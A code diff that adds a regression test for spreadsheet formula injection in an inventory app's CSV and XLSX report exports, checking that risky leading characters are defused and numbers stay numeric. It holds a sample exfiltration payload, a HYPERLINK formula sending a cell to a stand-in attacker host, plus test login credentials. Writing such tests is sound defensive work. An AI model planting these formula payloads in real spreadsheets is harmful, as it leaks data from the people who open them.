@@ -11380,6 +11380,159 @@ async def test_workbook_places_and_names():
     await clean()
 
 
+async def test_export_formula_injection():
+    """Suite BK — spreadsheet formula injection (CWE-1236) in report exports.
+
+    The exploit the 2026-08-05 security audit found: `consumption."Remarks"` is
+    free text written by a STORE KEEPER (role level 0, the lowest in the app)
+    and is exported verbatim by the Daily Consumption report, which an HOD or
+    admin then opens in Excel. A remark of `=HYPERLINK("https://…"&A1,"…")`
+    exfiltrates the row on one click; the DDE forms reach command execution.
+    Neither format escaped it — `csv.writer` wrote the string raw, and openpyxl
+    infers a leading `=` as a FORMULA cell.
+
+    Two layers of assertion, because the regression can reappear in two ways:
+
+      1. The renderers directly (`to_csv` / `to_xlsx`) — covers EVERY risky
+         lead character, not just `=`, and pins the constraint that makes this
+         fix safe to ship: numbers must stay numbers. Prefixing a quantity or a
+         valuation with an apostrophe would turn the accounting columns into
+         text and break the exports this guard exists to protect.
+      2. The real HTTP path — a store keeper posts the payload, an HOD approves
+         it into the ledger, and both formats are downloaded through the actual
+         endpoint. Layer 1 alone would still pass if someone bypassed the
+         renderers; this proves the wiring end to end.
+    """
+    import io as _io
+
+    import openpyxl as _px
+
+    from .reports import to_csv, to_xlsx
+    from .xlsx_style import DATA_ROW as _XD, HEADER_ROW as _XH
+
+    # --- Layer 1: the renderers ------------------------------------------------
+    # One row, one column per risky lead character, then the numeric types that
+    # must survive untouched.
+    payloads = ['=1+1', '+1+1', '-1+1', '@SUM(A1)', '\tSUM(A1)', '\r=1+1']
+    cols = [f"c{i}" for i in range(len(payloads))] + ["Qty", "Cost", "Plain"]
+    row = payloads + [42, 3.75, "Rubber Sheet 3mm"]
+
+    # Parsed with csv.reader, not splitlines(): the CR payload deliberately
+    # contains a line break, so a naive line split would tear the row in half
+    # and quietly assert against the wrong half.
+    import csv as _csv
+
+    csv_text = to_csv("t", cols, [row], "svc").decode("utf-8-sig")
+    body = next(r for r in _csv.reader(_io.StringIO(csv_text, newline="")) if r and r[0] != "c0")
+    missing = [p for p, got in zip(payloads, body) if got != f"'{p}"]
+    check("bk: to_csv apostrophe-prefixes every formula-leading character "
+          "(= + - @ tab CR), so no exported cell is ever evaluated",
+          not missing, f"undefused={missing!r}")
+    check("bk: to_csv leaves numbers alone — an apostrophe here would turn "
+          "every quantity and valuation column into text",
+          body[len(payloads):] == ["42", "3.75", "Rubber Sheet 3mm"],
+          repr(body[len(payloads):]))
+
+    ws = _px.load_workbook(_io.BytesIO(to_xlsx("t", cols, [row], "svc"))).active
+    cells = [c.value for c in ws[_XD]]
+    # openpyxl normalises a lone CR to LF inside a cell, so the CR payload reads
+    # back as '\n…'. Normalise the EXPECTATION the same way rather than dropping
+    # the CR case — it is one of the variants that slips past a naive '=' filter.
+    bad = [(p, got) for p, got in zip(payloads, cells)
+           if got != "'" + p.replace("\r", "\n")]
+    check("bk: to_xlsx apostrophe-prefixes the same set — openpyxl would "
+          "otherwise write a leading '=' as a real FORMULA cell",
+          not bad, f"undefused={bad!r}")
+    check("bk: no exported xlsx cell is stored as a formula",
+          all(c.data_type != "f" for c in ws[_XD]),
+          str([c.data_type for c in ws[_XD]]))
+    qty_c, cost_c = ws.cell(_XD, len(payloads) + 1), ws.cell(_XD, len(payloads) + 2)
+    check("bk: to_xlsx preserves numeric TYPES (int stays int, float stays "
+          "float) — the constraint that makes this patch safe for accounting",
+          qty_c.value == 42 and isinstance(qty_c.value, int)
+          and cost_c.value == 3.75 and isinstance(cost_c.value, float),
+          f"qty={qty_c.value!r} cost={cost_c.value!r}")
+    check("bk: an ordinary description is passed through unchanged — the guard "
+          "must not add an apostrophe to text that was never dangerous",
+          ws.cell(_XD, len(payloads) + 3).value == "Rubber Sheet 3mm",
+          repr(ws.cell(_XD, len(payloads) + 3).value))
+
+    # --- Layer 2: the real exploit path ----------------------------------------
+    TAG = "svc-formula-injection"
+    DATE = "2026-08-06"
+    EXPLOIT = f'=HYPERLINK("https://attacker.invalid/?x="&A1,"{TAG}")'
+    from sqlalchemy import text as _sqt
+
+    async def clean():
+        async with SessionLocal() as s:
+            for t in ("consumption", "pending_issues"):
+                await s.execute(_sqt(f'DELETE FROM {t} WHERE "Remarks" LIKE :p'),
+                                {"p": f"%{TAG}%"})
+            await s.commit()
+
+    await clean()
+    try:
+        transport = ASGITransport(app=app)
+        async with AsyncClient(transport=transport, base_url="http://svc") as ac:
+            _ip = {"X-Real-IP": "203.0.113.77"}
+
+            async def token(u, p):
+                r = await ac.post("/auth/login", headers=_ip,
+                                  json={"username": u, "password": p})
+                return r.json().get("access_token")
+
+            def H(t):
+                return {"Authorization": f"Bearer {t}"}
+
+            sk_t = await token("worker", "floor2026")      # store_keeper, level 0
+            admin_t = await token("admin", "admin2026")
+
+            r = await ac.post("/entry/consumption", headers=H(sk_t),
+                              json={"Date": DATE, "SAP_Code": "1001", "Quantity": 2,
+                                    "Site_ID": "CNCEC", "Remarks": EXPLOIT})
+            pid = r.json().get("pending_id") if r.status_code in (200, 201) else None
+            check("bk: a store keeper CAN stage the payload — the fix belongs at "
+                  "the export boundary, not as input rejection",
+                  pid is not None, f"{r.status_code} {r.text[:160]}")
+            ra = await ac.post(f"/hod/pending/issues/{pid}/approve", headers=H(admin_t))
+            check("bk: HOD approval commits it to the consumption ledger",
+                  ra.status_code == 200, f"{ra.status_code} {ra.text[:160]}")
+
+            params = {"date_from": DATE, "date_to": DATE, "site_id": "CNCEC"}
+            rc = await ac.get("/reports/daily-consumption", headers=H(admin_t),
+                              params={**params, "format": "csv"})
+            text_csv = rc.content.decode("utf-8-sig")
+            check("bk: END-TO-END csv — the staged payload reaches the admin's "
+                  "download defused, reading back as text beginning with an "
+                  "apostrophe rather than as a live HYPERLINK formula",
+                  rc.status_code == 200 and TAG in text_csv
+                  and "'=HYPERLINK" in text_csv and '"=HYPERLINK' not in text_csv,
+                  f"{rc.status_code} {text_csv[-240:]!r}")
+
+            rx = await ac.get("/reports/daily-consumption", headers=H(admin_t),
+                              params={**params, "format": "xlsx"})
+            wsx = _px.load_workbook(_io.BytesIO(rx.content)).active
+            head = [c.value for c in wsx[_XH]]
+            ri = head.index("Remarks") + 1
+            qi = head.index("Quantity") + 1
+            hit = [r_ for r_ in range(_XD, wsx.max_row + 1)
+                   if TAG in str(wsx.cell(r_, ri).value or "")]
+            cell_r = wsx.cell(hit[0], ri) if hit else None
+            cell_q = wsx.cell(hit[0], qi) if hit else None
+            check("bk: END-TO-END xlsx — the same row exports as a defused "
+                  "STRING cell, never data_type 'f'",
+                  rx.status_code == 200 and len(hit) == 1
+                  and str(cell_r.value).startswith("'=") and cell_r.data_type != "f",
+                  f"{rx.status_code} rows={hit} "
+                  f"value={str(cell_r.value)[:80] if cell_r else None!r}")
+            check("bk: END-TO-END xlsx — the Quantity on that same row is still "
+                  "a live number, so the report still totals correctly",
+                  cell_q is not None and isinstance(cell_q.value, (int, float)),
+                  f"qty={cell_q.value if cell_q else None!r}")
+    finally:
+        await clean()
+
+
 async def _rows_sql(sql: str, **params):
     from sqlalchemy import text as _sqt
     async with SessionLocal() as s:
@@ -11523,6 +11676,9 @@ async def main() -> int:
     await test_shared_throttle_and_widgets()
     print("\n BJ. Workbook seeds racks + assets; the app owns them; names beside codes")
     await test_workbook_places_and_names()
+    print("\n BK. Export formula injection — a store keeper's Remarks never "
+          "becomes a live formula in an admin's spreadsheet")
+    await test_export_formula_injection()
     await engine.dispose()
 
     print(f"\n== SERVICE TESTS: {'✅ PASS' if not FAILED else '❌ FAIL'} "
